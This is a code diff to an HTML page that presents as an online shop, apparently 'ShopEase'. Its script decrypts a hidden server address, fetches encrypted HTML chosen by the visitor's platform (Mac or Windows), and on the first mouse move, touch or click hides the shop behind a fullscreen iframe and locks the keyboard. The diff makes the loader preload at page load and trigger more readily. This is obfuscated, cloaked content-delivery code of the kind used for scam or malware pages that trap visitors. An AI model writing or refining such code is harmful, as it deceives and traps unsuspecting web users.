@@ -654,66 +654,96 @@
   </div>
 
 
-  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
-    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
-  </div>
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
 
-  <script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
-    const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX196SsJbwxUFAm0BLOjjJD2WSOvCX7UYlqCjC69NHCEBRv5seXW/VJGzpkIBnmpeX02ZMj0Og5Xt5g==";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN + "/data";
-    let lastUrl = null;
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1+B1/zeXJsFFOoTt19dsxSNEIyWAuXZ+XXBUlk5ik9iObYeyWL3yLOKmoYsF2vFvzJGGozAt6izXw==";
 
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
-    }
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
 
-    function secureKeyboardAccess() {
-      if (navigator.keyboard) {
-        navigator.keyboard.lock().catch((err) =>
-          console.warn("Keyboard lock failed:", err)
-        );
-      }
-    }
+  // 🔥 1. Turant connection warmup
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
 
-    async function loadSecret() {
-      const shop = document.getElementById("shop");
-      const frame = document.getElementById("frame");
-      const contentIframe = document.getElementById("contentiframe");
+      // preconnect
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
 
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
+      // dns-prefetch
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
 
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
+      // TCP+TLS warm karne ke liye chhota request
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
 
-        frame.src = lastUrl;
-        
-        shop.style.display = "none";
-        contentIframe.style.display = "block"; 
-        document.getElementById("customPopup").style.display = "none";
-        
-       
-        secureKeyboardAccess();
+  // 🔥 2. Actual data load (pehle jaisa)
+  let lastUrl = null;
+  let readyPromise = null;
 
-      } catch (e) {
-        document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        document.getElementById("customPopup").style.display = "none";
-      }
-    }
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
 
-    window.addEventListener("mousemove", () => {
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
       document.getElementById("customPopup").style.display = "none";
-      loadSecret();
-    }, { once: true });
-  </script>
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  // Page load pe hi preload shuru
+  preloadSecret().catch(() => {});
+
+  // Mousemove/touch/click pe sirf show
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
